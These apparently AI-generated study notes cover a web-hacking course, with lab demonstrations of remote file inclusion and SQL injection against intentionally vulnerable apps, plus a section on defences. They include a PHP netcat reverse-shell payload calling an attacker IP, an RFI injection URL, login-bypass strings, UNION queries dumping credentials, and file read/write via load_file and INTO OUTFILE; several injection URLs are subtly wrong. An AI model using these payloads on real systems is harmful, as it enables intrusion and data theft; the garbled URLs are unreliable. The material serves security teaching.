Based on the transcript, this lecture introduces **Remote File Inclusion (RFI)**, which is the "big brother" of the Local File Inclusion (LFI) vulnerability we just discussed.

While LFI lets you look at files *inside* the house, RFI lets you bring a package from *outside* the house and force the server to open it.

### Part 1: The Difference (LFI vs. RFI)

* **LFI (Local):** You trick the website into reading a file that is **already on the server** (like `/etc/passwd`). You cannot add new files; you can only read what is there.
* **RFI (Remote):** You trick the website into downloading and running a file from **your computer** (or anywhere on the internet).
    * **The Power:** This means you don't need to look for a vulnerability to upload a file. You just host a virus on your own website, tell the victim server to "include" it, and the victim downloads and runs it instantly.



### Part 2: The "Dangerous Switch" (Configuration)
RFI is so dangerous that modern web servers usually have it turned **OFF** by default. For this vulnerability to work, the server administrator must have made a mistake in the configuration.

The instructor explains the two specific settings in the PHP configuration file (`php.ini`) that control this:

1.  **`allow_url_fopen`**: Allows the server to open files via a URL (like `http://...`).
2.  **`allow_url_include`**: Allows the `include` function to use those URLs.

If **both** of these are set to `On`, the server is vulnerable to RFI.

### Part 3: The Lab Setup
Since modern servers usually block this, the instructor has to manually "break" the security on his practice machine (Metasploitable) to show you how the attack works.

**The Steps He Takes:**
1.  **Edit Config:** He uses a text editor called `nano` to open the main PHP settings file:
    `sudo nano /etc/php5/cgi/php.ini`
2.  **Find the Setting:** He searches (Control+W) for `allow_url_`.
3.  **Enable Vulnerability:** He ensures both `allow_url_fopen` and `allow_url_include` are set to **On**.
4.  **Restart Server:** He restarts the web server software (Apache) so the changes take effect:
    `sudo /etc/init.d/apache2 restart`

### Summary Checklist

| Vulnerability | Action | Source of File | Impact |
| :--- | :--- | :--- | :--- |
| **LFI** | Read sensitive files. | Internal Hard Drive | Information Leakage (Passwords, Configs). |
| **RFI** | Run malicious code. | **External Internet** | **Full System Takeover** (Reverse Shell). |

---
### <span style = "color: #569cd6">Remote File Inclusion Vulnerabilities - Discovering & Exploitation</span>

This lecture demonstrates the successful execution of the **Remote File Inclusion (RFI)** attack we prepared for in the previous video.

### Part 1: Creating the Payload (The Malicious Script)

The instructor creates a very simple PHP file that will act as the "virus."

**The Code:**

```php
<?php
passthru("nc -e /bin/sh 10.20.14.203 8080");
?>
```

  * **`<?php ... ?>`**: Tells the server "This is PHP code."
  * **`passthru()`**: This is a PHP function that passes commands directly to the operating system (Linux).
  * **The Command:** It runs the same **Netcat Reverse Shell** command used in the Code Execution lecture (`nc -e /bin/bash...`). It tells the victim to connect back to the attacker (10.20.14.203) on port 8080.

### Part 2: The "Extension Trick" (.txt vs .php)

This is the most critical and clever part of the lecture. The instructor saves this file as **`reverse.txt`**, NOT `reverse.php`.

**Why save it as a text file?**

  * **If saved as `.php`:** When the victim requests this file, the **Attacker's** web server would see the `.php` extension, execute the code *on the attacker's machine*, and send the *result* (which is nothing) to the victim. You would accidentally hack yourself\!
  * **If saved as `.txt`:** The **Attacker's** web server treats it as plain text. It sends the *actual code* (the text `<?php passthru...`) to the victim.
  * **The Result:** The **Victim** receives the raw PHP code. Since the victim is using the `include()` function, it takes that text and executes it as code *on the victim's machine*.

### Part 3: The Setup

1.  **Host the File:** The instructor saves `reverse.txt` in his own web server folder (`/var/www/html/`) on the Kali machine (IP: 10.20.14.203).
2.  **Verify Accessibility:** He checks `http://10.20.14.203/reverse.txt` in the browser to ensure the file is reachable.
3.  **Start the Listener:** He opens a terminal and starts Netcat to wait for the incoming connection:
    `nc -vv -l -p 8080`

### Part 4: The Attack

1.  **The Vulnerable URL:** He goes to the victim's website.
    `http://10.20.14.204/.../?page=`
2.  **The Injection:** He points the page parameter to his malicious text file.
    `http://10.20.14.204/dvwa/vulnerabilities/fl/?page=http://10.20.14.203/reverse.txt?`
3.  **The Execution:**
      * The Victim Server downloads `reverse.txt`.
      * The Victim Server executes the code inside it.
      * The Victim Server runs the Netcat command.
4.  **Success:** The terminal on the attacker's machine lights up with a connection. The instructor types `uname -a` and confirms he is now controlling the Metasploitable server.

### Summary Checklist

| Step | Action | Why? |
| :--- | :--- | :--- |
| **1. Create** | Write PHP script with `passthru()`. | To run system commands via PHP. |
| **2. Save** | Save as **`.txt`** (not `.php`). | To ensure the *code* is transferred, not the *result*. |
| **3. Host** | Put file on Attacker's server. | So the victim can download it. |
| **4. Listen** | Run `nc -l -p 8080`. | To catch the reverse shell connection. |
| **5. Inject** | URL pointing to the `.txt` file. | Triggers the download and execution on the victim. |

---
### <span style = "color: #569cd6">Preventing The Above Vulnerabilities</span>

 This lecture shifts from "How to break it" to **"How to fix it."**

The instructor explains that most vulnerabilities happen because developers trust users too much. The golden rule of security is: **Never trust user input.**

### 1\. Preventing File Upload Hacks

**The Problem:** You allow users to upload "profile pictures," but they upload malicious PHP scripts (viruses) instead.

**The Fixes:**

  * **Don't rely on extensions:** Checking if a file ends in `.jpg` is weak because hackers can fake file names (e.g., `virus.php.jpg`).
  * **Check the File Type (MIME Type):** Look at the actual content of the file. A real image file has specific digital "fingerprints" inside it. If the user uploads a script disguised as an image, a deep check will reveal it is text, not a picture.
  * **Re-encode the Image:** Some secure sites take the uploaded image and re-save it. This destroys any hidden code inside the file.

### 2\. Preventing Code Execution

**The Problem:** You have a "Ping" tool that takes an IP address, but a hacker adds `; rm -rf /` to delete your files.

**The Fixes:**

  * **Avoid System Commands:** The best defense is to **not** use functions like `exec()` or `passthru()` that talk directly to the Operating System. If you need to ping something, use a built-in programming library, not the Linux command line.
  * **Input Validation (The Bouncer):** If you *must* use system commands, you need a strict "Bouncer" at the door.
      * **Regex (Regular Expressions):** This is a code pattern that defines exactly what legitimate input looks like.
      * *Example:* You tell the code, "Only accept input that looks like `digit.digit.digit.digit`."
      * If a hacker types `;` or `bash` or `&`, the application sees it doesn't match the pattern and rejects it immediately.

### 3\. Preventing File Inclusion (LFI/RFI)

**The Problem:** You let the URL determine which file to open (`index.php?page=news.php`), allowing hackers to change it to `?page=../../etc/passwd` or `?page=http://hacker.com/virus.txt`.

**Fix A: The Configuration Switch (For RFI)**
We learned that Remote File Inclusion (RFI) only works if the server allows downloading files from the internet.

  * **Action:** Open your `php.ini` file.
  * **Setting:** Set `allow_url_fopen` and `allow_url_include` to **Off**.
  * **Result:** The server will refuse to load any file that starts with `http://`.

**Fix B: Static File Inclusion (For LFI)**
The root cause of LFI is **Dynamic Inclusion**—letting a variable (user input) decide the filename.

  * **The Insecure Way (Dynamic):**

    ```php
    $page = $_GET['page']; // User controls this variable!
    include($page);        // Server blindly obeys.
    ```

  * **The Secure Way (Static):**
    Hard-code the allowed files.

    ```php
    $page = $_GET['page'];
    if ($page == "news") {
       include("news.php"); // The filename is written by the developer, not the user.
    } else if ($page == "contact") {
       include("contact.php");
    } else {
       print("Error: Page not found.");
    }
    ```

      * **Result:** Even if the hacker types `?page=../../etc/passwd`, the code will just say "Error: Page not found" because it doesn't match "news" or "contact."

### Summary Checklist

| Vulnerability | The "Quick Fix" (Weak) | The "Real Fix" (Strong) |
| :--- | :--- | :--- |
| **File Upload** | Checking for `.jpg` extension. | Checking file content/type headers. |
| **Code Execution** | Blocking specific words. | **Input Validation (Regex)** or avoiding system commands entirely. |
| **File Inclusion** | Blocking `../` characters. | **Static Inclusion** (Hard-coding allowed pages). |
---

SQL INJECTION VULNERABILITIES
===

### <span style = "color: #569cd6">What is SQL?</span>

This lecture serves as the **theory foundation** for one of the most popular and dangerous web vulnerabilities: **SQL Injection (SQLi)**.

Before teaching you how to break into the vault (the database), the instructor takes you *inside* the vault to show you exactly how it is organized and what treasures are hidden there.

### Part 1: What is a Database?
Most modern websites are not just static text files. They are dynamic applications that need to remember things. The **Database** is the website's memory.

* **What it stores:** Usernames, passwords, blog posts, comments, product prices, and (most critically) credit card numbers.
* **How it works:** When you log in to a website, the website sends a message to the database: *"Hey, do you have a user named 'admin' with the password '12345'?"*
* **The Language:** The language used to ask these questions is called **SQL** (Structured Query Language).

```bash
root@kali:~# mysql -u root -h 10.20.14.204
mysql> show databases;

```



### Part 2: Inside the Database (The Demo)
The instructor logs into the database of the vulnerable machine directly (using the terminal, not a hack) to show you the hierarchy. It looks like a filing cabinet:

#### 1. Databases (The Drawers)
* **Command:** `show databases;`
* **Result:** A list of different projects stored on the server.
    * `dvwa` (The practice app we used earlier)
    * `owasp10` (Another vulnerable app)
    * `mysql` (System settings)
    * `tikiwiki`
    * `metaploit`
* **Analogy:** These are the different drawers in the filing cabinet. Each drawer belongs to a different website or application.

#### 2. Tables (The Folders)
The instructor opens one specific database (`owasp10`) to see what is inside.
* **Command:** `use owasp10; show tables;`
* **Result:** A list of specific categories:
    * `accounts` (User data)
    * `blogs_table` (Posts)
    * `captured_data` 
    * `credit_cards` (Financial data)
    * `pen_test_tools`
* **Analogy:** Inside the "OWASP" drawer, there are separate folders. One folder holds all the account info, another holds all the credit card info.

#### 3. Data (The Papers)
Finally, the instructor pulls out the `accounts` table to read the actual data.
* **Command:** `select * from accounts;`
    * `select *`: "Show me everything"
    * `from accounts`: "...inside the accounts folder."
* **Result:** He sees the actual "loot":
    * **Columns:** `username`, `password`, `is_admin`, `signature`.
    * **Rows:** Actual users like `admin` (password: `adminpass`) and `adrian` (password: `somepassword`).

### Why this matters for Hacking
The instructor emphasizes that normally, **only the website administrator** has permission to see this data.

**The Goal of SQL Injection:**
In the next lectures, you will learn how to trick the *website* into running these exact commands (`select * from accounts`) for you. Instead of logging in properly, you will force the website to dump the contents of the `credit_cards` table right onto your screen.

### Summary Checklist

| Component | SQL Command Used | Analogy |
| :--- | :--- | :--- |
| **Server** | `mysql -u root` | The entire filing cabinet. |
| **Database** | `show databases;` | A specific drawer (e.g., for one website). |
| **Table** | `show tables;` | A specific folder inside the drawer (e.g., "Users"). |
| **Data** | `select * from [table];` | The actual documents (Usernames/Passwords). |

---
### <span style = "color: #569cd6">Danger of SQL Injection Vulnerabilities</span>

This lecture serves as a "motivation" segment, explaining why hackers spend so much time hunting for **SQL Injection (SQLi)** vulnerabilities. The instructor argues that it is arguably the most dangerous flaw a website can have.

SQL Injection is considered the "King" of web vulnerabilities.

### 1. The "Game Over" Scenario
In many hacking scenarios (like the ones we studied earlier), you have to chain multiple attacks together: find a flaw $\rightarrow$ upload a shell $\rightarrow$ escalate privileges $\rightarrow$ find the database password $\rightarrow$ steal data.

With SQL Injection, you skip all those steps.
* **Direct Access:** You are talking directly to the vault.
* **The Loot:** You immediately get usernames, passwords, emails, and **credit card numbers**.
* **Why risk it?** The instructor notes that if your goal is just to steal data, uploading a virus (Shell) increases your risk of getting caught by antivirus software. SQL Injection is stealthier (kín đáo hơn) and gives you exactly what you want immediately.

### 2. Prevalence (They are everywhere)
* **The Big Guys Fall Too:** The instructor mentions that even giants like Yahoo and Google have suffered from these flaws in the past.
* **Human Error:** It is very hard for developers to perfectly protect every single input box on a massive website. It only takes one mistake to open the door.

### 3. The "Swiss Army Knife" of Hacking
The most interesting part of this lecture is when the instructor explains that SQL Injection can actually mimic other vulnerabilities. It isn't *just* about stealing data.



* **It can act like LFI (File Inclusion):**
    Advanced SQL attacks allow you to read files from the hard drive (e.g., using the `load_file()` command in MySQL). You can read `/etc/passwd` just like we did in the LFI lecture.
* **It can act like File Upload:**
    You can use SQL to **write** new files to the server (e.g., using `into outfile`).
    * **The Attack:** You can literally tell the database: *"Create a new file called `virus.php` and put this malicious code inside it."*
    * **Result:** You effectively uploaded a backdoor without even having an upload button on the website.

### 4. SQLi vs. The Shell (A Strategic Comparison)
The instructor makes a crucial distinction between controlling the **Server** (OS) and controlling the **Data** (Database).

* **The Shell (Weevely/Metasploit):** Gives you control over the *computer* (Linux/Windows). But, if the database is encrypted or locked down, you might be on the server but still unable to read the credit cards.
* **SQL Injection:** Gives you control over the *Data*. Since the data is usually the thing hackers want to sell or use, this is often more valuable than the shell itself.

### Summary Checklist

| Vulnerability | Primary Impact | Hidden Powers |
| :--- | :--- | :--- |
| **SQL Injection** | **Data Theft** (Passwords/Credit Cards). | Can read system files & write viruses to disk. |
| **File Upload** | **System Control** (Shell). | Requires further work to access the database. |

---
### <span style = "color: #569cd6">Discovering SQL Injection in POST</span>

Based on the transcript, this lecture teaches you how to **find** and **confirm** an SQL Injection vulnerability.

The instructor demonstrates a methodical process:
1.  **Break it** (using a special character).
2.  **Analyze the Error** (to understand the code).
3.  **Fix it** (to prove you can control the code).

`http://10.20.14.204/multillidae/index.php` 


### Part 1: The "Quote Test" (Breaking the Page)
To find an SQL injection, you need to input something that confuses the database. The universal test is the **Single Quote (`'`)**.

* **The Action:** The instructor types `Zaid` as the username and puts a single quote `'` in the password field.
* **The Result:** The website crashes and shows a database error:
    > *"Error in your SQL syntax... near '''' at line 1"*
* **Why this happens:**
    * **Normal Code:** The website expects: `SELECT * FROM users WHERE password = 'user_input'`
    * **Injected Code:** The website received: `SELECT * FROM users WHERE password = ''`
    * **The Crash:** The database sees three quotes (an uneven number) and doesn't know where the password ends. It panics and throws an error.



### Part 2: Analyzing the Syntax
The error message was very helpful (which is lucky!). It showed the instructor exactly what the database was trying to do:
`SELECT * FROM accounts WHERE username='Zaid' AND password='...'`

* **The Structure:** The code puts the password inside single quotes.
* **The Strategy:** To inject our own code, we must:
    1.  **Close** the existing quote (to finish the password field).
    2.  **Add** our malicious command.
    3.  **Ignore** the rest of the original code (so it doesn't cause errors).

### Part 3: The "True/False" Test (Confirming Control)
Breaking the site is easy. Controlling it is harder. The instructor uses boolean logic (True/False questions) to prove he is in control.

#### Test A: The "True" Statement
* **The Injection:** `' AND 1=1 #`
    * `'` : Closes the password field.
    * `AND 1=1`: A logic question. Is 1 equal to 1? (Yes, this is **True**).
    * `#`: A comment symbol. It tells the database to **ignore** everything after this point (getting rid of the dangling quote that caused the crash earlier).
* **The Result:** He logs in successfully.
* **Meaning:** The database ran the logic, saw it was True, and allowed access.

#### Test B: The "False" Statement
* **The Injection:** `' AND 1=2 #`
    * `AND 1=2`: Is 1 equal to 2? (No, this is **False**).
* **The Result:** "Bad username or password."
* **Meaning:** Even though he typed the correct password, his injected code (`1=2`) forced the database to say "False" and block the login.

### Summary of the Confirming Process

| Action | Injection Payload | Result | Conclusion |
| :--- | :--- | :--- | :--- |
| **Break** | `'` | **Error Message** | Vulnerability likely exists. |
| **Fix (True)** | `' AND 1=1 #` | **Logged In** | Code is executing successfully. |
| **Fix (False)** | `' AND 1=2 #` | **Login Failed** | We are fully controlling the logic. |

```bash
select * from accounts where username = 'zaid' and passowrd='123456' and 1=1#'
```
- password: 123456'
- append: and 1=1#
    - username: `zaid`
    - password: `123456' and 1=1#`
=> after typing this trick, we get access without even knowing the password.
---
### <span style = "color: #569cd6">Bypassing Login Pages Using SQL Injection</span>

Based on this transcript, the instructor demonstrates **SQL Injection Authentication Bypass**. This is the classic "movie hacker" move where you log in as the Administrator without ever knowing their password.

### Method 1: The Logic Bypass (The "OR" Attack)

This method tricks the database into agreeing with you, even if you lie about the password.

**The Concept:**
In logic, an **"OR"** statement is TRUE if *at least one* part of it is true.

  * "The sky is green (False) **OR** Water is wet (True)" $\rightarrow$ **Result: TRUE**.

**The Attack:**

1.  **Username:** `admin`
2.  **Password Injection:** `123' OR 1=1 #`
      * `123'` : The fake password (closes the quote).
      * `OR` : The magic logic operator.
      * `1=1` : A statement that is always True.
      * `#` : The comment sign (ignores the rest of the code).

**What the Database Sees:**

```sql
SELECT * FROM users WHERE username = 'admin' AND password = '123' OR 1=1 #'
```

**Why it works:**
The database looks at the password check (`password='123'`). This is False.

  * *However*, it then sees `OR 1=1`.
  * Since `1=1` is True, the **entire statement becomes True**.
  * The database thinks: "Well, the logic checks out\!" and logs you in.


### Method 2: The "Comment" Bypass (The Eraser)

This method is even cleaner. You tell the database to simply **ignore** the password requirement entirely.

**The Concept:**
In SQL, the hash symbol (`#`) is a **Comment**. It tells the computer: *"Everything after this symbol is just a note for humans, do not run it."*

**The Attack:**

1.  **Username Injection:** `admin' #`
      * `admin` : The target user.
      * `'` : Closes the username field.
      * `#` : The comment symbol.
2.  **Password:** (Anything you want, or leave it blank).

**What the Database Sees:**
Original Code:

```sql
SELECT * FROM users WHERE username = '$user' AND password = '$pass'
```

Injected Code:

```sql
SELECT * FROM users WHERE username = 'admin' # AND password = '...'
```

**Why it works:**
Because of the `#`, the database **stops reading** right after "admin". It never even sees the part where it's supposed to check the password.

  * The query effectively becomes: *"Find the user named Admin."*
  * The database replies: *"Okay, here is the Admin account."*

-----

### Summary of Techniques

| Method | Payload Example | How it works |
| :--- | :--- | :--- |
| **Logic Bypass** | `' OR 1=1 #` | Uses `OR` to force the database to say "True." |
| **Comment Bypass** | `admin' #` | Uses `#` to delete the password check from the code. |

### Important Note on "Black Box Testing"

The instructor mentions **Black Box Testing** at the end. This means you are hacking blindly—you cannot see the code.

  * You don't *know* if the developer used single quotes (`'`) or double quotes (`"`).
  * You don't *know* if the comment symbol is `#` (MySQL) or `--` (PostgreSQL/SQL Server).
  * **The Strategy:** You have to guess. If `' #` doesn't work, you try `" #`. If that doesn't work, you try `' --`. You keep guessing until you find the combination that fits the lock.

---
### <span style = "color: #569cd6">Discovering SQL Injection in GET</span>

This lecture introduces two major shifts in our SQL Injection strategy:
1.  **Attacking the URL** (GET requests) instead of Login Forms (POST requests).
2.  **Mapping the Database** using the `ORDER BY` command to confirm a vulnerability.

### Part 1: GET vs. POST (The Attack Surface)
The instructor points out a critical difference in how data is sent to the server.

* **POST (The Login Page):** In previous lectures, we used a login box. When you hit "Login," the username and password are packed inside an "envelope" (the HTTP Body). You can't see them in the address bar.
* **GET (The User Info Page):** In this lecture, the website puts the data directly into the URL (the address bar).
    * **The URL:** `http://site.com/user-info.php?username=zaid&password=123`
    * **The Advantage:** This is easier for hackers. You don't need to reload the page or use a proxy tool. You can just edit the text right in your browser's address bar and hit Enter.

### Part 2: URL Encoding (Speaking the Browser's Language)
When typing SQL commands into the address bar, you cannot always use special symbols like `#` or spaces directly, because the browser uses those symbols for its own navigation (e.g., `#` is usually an anchor to jump to the bottom of a page).

You must translate them into "URL Code" (Percent Encoding):
* **Space** becomes **`%20`**
* **Hash (`#`)** becomes **`%23`**

**The Injection:**
Instead of typing: `zaid' order by 1 #`
You type: `zaid'%20order%20by%201%20%23`

### Part 3: The "ORDER BY" Technique
This is a clever way to ask the database a question without breaking it.

**The Concept:**
In SQL, `ORDER BY` tells the database how to sort the results (e.g., "Sort by Name" or "Sort by ID").
* You can sort by the **Column Name** (e.g., `ORDER BY username`).
* OR, you can sort by the **Column Number** (e.g., `ORDER BY 1` means "Sort by the first column").



**The Vulnerability Test:**
The instructor uses this to prove the database is listening to him.

1.  **The "True" Test:**
    * **Injection:** `ORDER BY 1`
    * **Question:** "Database, please sort these results by the 1st column."
    * **Result:** The page loads normally.
    * **Meaning:** The database obeyed. (It confirms there is at least 1 column).

2.  **The "False" Test:**
    * **Injection:** `ORDER BY 100000`
    * **Question:** "Database, please sort these results by the 100,000th column."
    * **Result:** **CRASH / ERROR**. ("Unknown column 100000").
    * **Meaning:** The database tried to obey, failed, and told you why.

```sql
SELECT * FROM users WHERE username = 'zaid' order by 1#' and password = '$password'
```
=>
`
http://10.20.14.204/multillidae/index.php?page=user-info.php&username=zaid' order by 100000%23&password=123456&user-info-php-submit-button=View+Account+Details
`

**Why is this exciting?**
If the website was secure, it would have treated "ORDER BY 1" as just part of your name (e.g., searching for a user named "Mr. Order By").
The fact that it *tried* to sort the data (and failed when the number was too high) proves that **you are controlling the database commands.**

### Summary Checklist

| Action | Injection Payload | Result | Conclusion |
| :--- | :--- | :--- | :--- |
| **Switch Method** | Edit the URL directly. | N/A | Faster testing (GET Request). |
| **Encode** | Use `%23` instead of `#`. | Browser accepts it. | Ensures the comment reaches the server. |
| **Test (Pass)** | `ORDER BY 1` | **Normal Page** | Database is executing your sort command. |
| **Test (Fail)** | `ORDER BY 10000` | **Error Message** | Confirmed SQL Injection! |

---
### <span style = "color: #569cd6">Reading Database Information</span>

Based on the transcript, this lecture covers the two most important steps in exploiting an SQL Injection: **Counting Columns** and **Extracting Data** using the `UNION` operator.

Here is the detailed breakdown of the process.

### Part 1: Counting the Columns (The `ORDER BY` Method)
Before you can ask the database for information, you need to know the shape of the table you are talking to.

* **The Problem:** The website is running a hidden query like `SELECT name, age, address FROM users...`. You don't know how many items (columns) it is asking for. Is it 3? 5? 10?
* **The Rule:** To use the advanced `UNION` attack later, your injection **must** have the exact same number of columns as the original query.
* **The Technique:** The instructor uses the `ORDER BY` command (which we learned in the previous lecture) to find this number by trial and error.

**The Trial and Error Process:**
1.  `ORDER BY 1` $\rightarrow$ Works (There is at least 1 column).
2.  `ORDER BY 100,000` $\rightarrow$ Error (There aren't that many).
3.  `ORDER BY 10` $\rightarrow$ Error (Too high).
4.  `ORDER BY 5` $\rightarrow$ **Works.**
5.  `ORDER BY 6` $\rightarrow$ Error.

**Conclusion:** Since 5 works but 6 crashes the site, the hidden table has exactly **5 columns**.


### Part 2: The `UNION SELECT` Attack
Now that we know the magic number is **5**, we can use the `UNION` operator.

**What is `UNION`?**
In SQL, `UNION` allows you to combine the results of two different queries into one list.
* **Query 1 (Original):** `SELECT * FROM accounts...` (The website's normal data).
* **Query 2 (Yours):** `SELECT 1, 2, 3, 4, 5` (Your injected data).
* **Result:** The website displays its data *plus* your data on the screen.



**The Injection Payload:**
The instructor injects this into the URL:
`UNION SELECT 1, 2, 3, 4, 5`

**The "Magic Numbers":**
When the page loads, the instructor sees numbers appearing on the screen where the user data usually is.
* He sees the number **2** (where the name usually is).
* He sees the number **3** (where the password usually is).
* He sees the number **4** (where the signature usually is).

**Why this matters:** These numbers tell you **where the holes are**.
* If you see the number "2" on the screen, it means: *"Anything you put in the 2nd position of your query will be printed right here."*

### Part 3: Extracting System Data
Now that we know columns 2, 3, and 4 are visible (vulnerable), we replace those numbers with special SQL commands to steal information.

The instructor modifies the injection:
Instead of: `UNION SELECT 1, 2, 3, 4, 5`
He types: `UNION SELECT 1, database(), user(), version(), 5`

**The Results:**
The website replaces the numbers with the answers to those questions:
1.  **Position 2 (`database()`)** $\rightarrow$ returns **`owasp10`**.
    * *Intel:* This is the name of the current database.
2.  **Position 3 (`user()`)** $\rightarrow$ returns **`root@localhost`**.
    * *Intel:* This is huge. `root` is the Super Administrator. This means the website is connecting to the database with unlimited power.
3.  **Position 4 (`version()`)** $\rightarrow$ returns **`5.0.51`**.
    * *Intel:* This is the version of the MySQL software (useful for finding other bugs).

`
http://10.20.14.204/multillidae/index.php?page=user-info.php&username=zaid' order by 1#&password=123456&user-info-php-submit-button=View+Account+Details
`
=> 
`
http://10.20.14.204/multillidae/index.php?page=user-info.php&username=zaid' union select 1,database(),user(),version(),5%23&password=123456&user-info-php-submit-button=View+Account+Details
`

### Summary Checklist

| Step | Action | Command/Payload | Goal |
| :--- | :--- | :--- | :--- |
| **1. Count** | **Order By** | `ORDER BY 5` | Find the number of columns (5). |
| **2. Locate** | **Union Select** | `UNION SELECT 1,2,3,4,5` | See which numbers appear on screen (2, 3, 4). |
| **3. Extract** | **System Info** | `UNION SELECT 1, database(), user(), 4, 5` | Replace the visible numbers with data you want to steal. |

---
### <span style = "color: #569cd6">Discovering Database Tables</span>

Based on the transcript, this lecture covers the next critical step in the "Kill Chain" of SQL Injection. You know the **Database Name** (`owasp10`); now you need to find the **Table Names** inside it (to find where the passwords or credit cards are hidden).

### Part 1: The "Master Map" (`information_schema`)
The instructor introduces a built-in database called **`information_schema`**.

* **What is it?** Think of this as the "Building Directory" or "Index" of the entire server. It doesn't store user data itself; instead, it stores lists of *all* the databases, tables, and columns that exist on the server.
* **Why Hackers use it:** Since you don't know the table names (e.g., is it `users`? `members`? `staff`?), you can ask `information_schema`: *"Please give me a list of all tables you have."*



### Part 2: The Injection Payload

**The Query:**
`UNION SELECT 1,table_name,null,null,5 FROM information_schema.tables`

* **`SELECT table_name`**: "I want the names of the tables."
* **`FROM information_schema.tables`**: "Look inside the Master Directory."
* **`1, ...,null,null, 5`**: These are the filler numbers to keep the query valid (remember, we need 5 columns total, and we are using column #2 to show the data).

`
http://10.20.14.204/multillidae/index.php?page=user-info.php&username=zaid' union select 1,table_name,null,null,5 from information_schema.tables%23&password=123456&user-info-php-submit-button=View+Account+Details
`

### Part 3: The "Filter" (`WHERE` Clause)
When the instructor first runs the command, he gets **237 results**.
* **The Problem:** This includes *every* table on the server, including system tables (like `help_topic`, `time_zone`) and tables from other websites (like `tikiwiki`). It's too much noise.

**The Fix:**
He adds a filter to only see tables belonging to the target database (`owasp10`).

**Refined Query:**
`... FROM information_schema.tables WHERE table_schema = 'owasp10'`

* **`table_schema`**: In SQL terms, "Schema" basically means "Database."
* **The Translation:** "Show me the table names, but ONLY for the database named `owasp10`."

`
http://10.20.14.204/multillidae/index.php?page=user-info.php&username=zaid' union select 1,table_name,null,null,5 from information_schema.tables where table_schema = 'owasp10'%23&password=123456&user-info-php-submit-button=View+Account+Details
`

### Part 4: The Loot (Results)
After applying the filter, the list shrinks to just the relevant tables:
1.  **`accounts`** (Likely contains usernames/passwords).
2.  **`credit_cards`** (The holy grail for financial theft).
3.  **`blogs`** (Public posts).
4.  **`hitlog`** (Logs).

### Summary Checklist

| Component | SQL Command / Term | Purpose |
| :--- | :--- | :--- |
| **Source** | `information_schema` | The built-in database that lists all structure info. |
| **Target** | `table_name` | The specific piece of info we are stealing. |
| **Filter** | `WHERE table_schema = 'owasp10'` | Narrowing the search to our target website only. |
| **Result** | `accounts`, `credit_cards` | The specific tables we now want to attack. |

---
### <span style = "color: #569cd6">Extracting Sensitive Data From The Database</span>

Based on the transcript, this lecture is the **Grand Finale** of the SQL Injection attack. You have navigated the map, found the vault, and now you are finally stealing the gold (Usernames and Passwords).

This involves two distinct steps:
1.  Finding the **Column Names** (so you know what to ask for).
2.  Dumping the **Data** (getting the actual credentials).

### Step 1: Finding the Column Names
Just like you asked `information_schema` for a list of tables, now you ask it for a list of columns.

**The Query:**
`UNION SELECT 1, column_name,null,null,5 FROM information_schema.columns WHERE table_name = 'accounts'`

* **`SELECT column_name`**: "I want the names of the columns."
* **`FROM information_schema.columns`**: "Look inside the Master Directory of Columns."
* **`WHERE table_name = 'accounts'`**: "Only show me the columns for the 'accounts' table."

`
http://10.20.14.204/multillidae/index.php?page=user-info.php&username=zaid' union select 1,table_name,null,null,5 from information_schema.column where table_schema = 'accounts'%23&password=123456&user-info-php-submit-button=View+Account+Details
`

**The Result:**
The website displays the ingredients of the "Accounts" table:
* `cid` (ID number)
* `username`
* `password`
* `mysignature`
* `is_admin`

### Step 2: Dumping the Data (The Loot)
Now that you know the exact names (`username` and `password`), you can construct the final query to steal them.

**The Query:**
`UNION SELECT 1, username, password, is_admin, 5 FROM accounts`

* **`SELECT username, password, is_admin`**: "Show me the data inside these columns."
* **`FROM accounts`**: "Get it from the accounts table."
* **Placement**: Note that the instructor puts `username` in position 2, `password` in position 3, and `is_admin` in position 4. This ensures they appear visibly on the screen.

`
http://10.20.14.204/multillidae/index.php?page=user-info.php&username=zaid' union select 1,table_name,password,is_admin,5 from accounts%23&password=123456&user-info-php-submit-button=View+Account+Details
`

**The Result:**
The website, which normally shows your own profile, now prints out a list of **every single user** in the database.
* **User:** `admin` | **Pass:** `adminpass` | **Is Admin:** `TRUE`
* **User:** `adrian` | **Pass:** `somepassword` | **Is Admin:** `FALSE`



### Summary of the Entire SQL Injection Process

To recap the last few lectures, here is the full "Kill Chain" the instructor demonstrated:

| Step | Goal | Command / Technique |
| :--- | :--- | :--- |
| **1. Detection** | Find the flaw. | `'` (Single Quote) to break the page. |
| **2. Mapping** | Count visible columns. | `ORDER BY 1`, `ORDER BY 5`... |
| **3. Recon** | Find DB name & User. | `UNION SELECT 1, database(), user()...` |
| **4. Tables** | List all tables. | `FROM information_schema.tables` |
| **5. Columns** | List table ingredients. | `FROM information_schema.columns` |
| **6. Dump** | **Steal Data.** | `SELECT username, password FROM accounts` |

### Final Takeaway
The instructor emphasizes that obtaining the **Admin** credentials (`admin` / `adminpass`) is critical. Logging in as an Admin usually gives you file upload permissions, which allows you to upload a virus (Shell) and take full control of the server, effectively circling back to the "File Upload" attacks taught earlier.

**This concludes the SQL Injection section of your course material.** Would you like to move on to the next major module (usually **Man-in-the-Middle Attacks** or **Cryptography**), or do you have any specific questions about these SQL commands?

---
### <span style = "color: #569cd6">Reading & Writing Files On The Server Using SQL Injection Vulnerability</span>

This lecture covers the most advanced and dangerous capabilities of SQL Injection: **interacting with the operating system's file system**.

The instructor demonstrates that SQL Injection isn't just about stealing data from the database. If you have the right permissions, you can use it to **read system files** (like a spy) or **create new files** (like a saboteur).

### Part 1: Reading Files (`load_file`)
This technique mimics the **Local File Inclusion (LFI)** vulnerability we learned earlier.

* **The Goal:** Read sensitive files on the server (like `/etc/passwd`) even though they are outside the website's folder.
* **The Command:** `load_file('path/to/file')`
* **The Injection:**
    The instructor modifies his `UNION SELECT` statement. Instead of asking for the database name, he asks the database to go fetch a file.

    `UNION SELECT null, load_file('/etc/passwd'), null, null, null`

`
http://10.20.14.204/multillidae/index.php?page=user-info.php&username=zaid' union select union select null, load_file('/etc/passwd'),null,null,null%23&password=123456&user-info-php-submit-button=View+Account+Details
`


* **The Result:** The content of the password file is dumped directly onto the webpage where the user's profile information usually appears.


### Part 2: Writing Files (`INTO OUTFILE`)
This technique mimics the **File Upload** vulnerability.

* **The Goal:** Create a new file on the server. Ideally, you want to create a PHP Shell (virus) inside the website's folder so you can run it and take over the server.
* **The Command:** `INTO OUTFILE 'path/to/new/file'`
* **The Syntax:**
    You type the content you want to write inside the `SELECT` part, and the destination path at the end.

    `UNION SELECT null,'example example', null, null, null INTO OUTFILE '/var/www/multilidae/example.txt'`

#### The "Permissions" Problem
The instructor hits a snag during the demo:
